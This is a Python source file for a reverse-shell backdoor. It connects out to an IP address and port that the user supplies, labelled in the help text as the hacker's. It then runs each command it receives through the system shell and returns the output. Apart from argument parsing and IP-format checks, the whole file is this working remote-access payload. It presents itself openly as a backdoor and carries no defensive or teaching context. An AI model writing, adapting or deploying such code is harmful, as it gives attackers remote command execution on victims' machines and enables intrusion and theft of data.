from socket import *
import subprocess
import argparse
from termcolor import cprint

class Backdoor:
    def __init__(self, address, port):
        self.connection = socket(AF_INET, SOCK_STREAM)
        self.connection.connect((address, port))

    def execute_sys_cmd(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            try:
                command = self.connection.recv(1024).decode()
                result = self.execute_sys_cmd(command).decode()
                self.connection.send(f'{len(result)}\r\n{result}'.encode())
            
            except subprocess.CalledProcessError:
                self.connection.send(b'10\r\nNO COMMAND')

        self.connection.close()


'''
Error raised if the user doesn't specify a valid target IP address
'''
class NoAddressSpecified(Exception):
    pass


'''
Error raised if the user doesn't specify a valid gateway IP address
'''
class NoPortSpecified(Exception):
    pass


'''
Evaluate if IP_address is valid
'''
def check_format_IP(IP_address):
    #Split the IP address in the fields separated by '.'
    IP_numbers = IP_address.split('.')
    
    #Error in the format if the number of fields is != 4 
    if len(IP_numbers)!=4:
        raise NoAddressSpecified
    else:
        #Check if each field has valid value (>=0 and <256)
        for num in IP_numbers:
            if(int(num)>255 or int(num)<0):
                raise NoAddressSpecified

    return IP_address

'''
Parser of command line arguments
'''
def args_parser():
    #Parser of command line arguments
    parser = argparse.ArgumentParser()
    #Initialization of needed arguments
    parser.add_argument("-address", "-a", dest="address", help="IP address of the hacker")
    parser.add_argument("-port", "-p", dest="port", help="Port number of the hacker")
    #Parse command line arguments
    args = parser.parse_args()
    
    #Check if the arguments have been specified on command line
    try:
        if not args.address:
            raise NoAddressSpecified
        
        if not args.port:
            raise NoPortSpecified
        
        address=check_format_IP(args.address)
        cprint('\nAddress:   ', 'yellow', attrs=['bold',], end='')
        print(f'{address}')
        cprint('Port:  ', 'green', attrs=['bold',], end='')
        print(f'{args.port}', end='\n\n')

    except (NoAddressSpecified, NoPortSpecified) as e :
        parser.print_help()
        exit(0)

    return address, int(args.port)


if __name__=='__main__':
    address, port = args_parser()
    client = Backdoor(address, port)
    client.run()
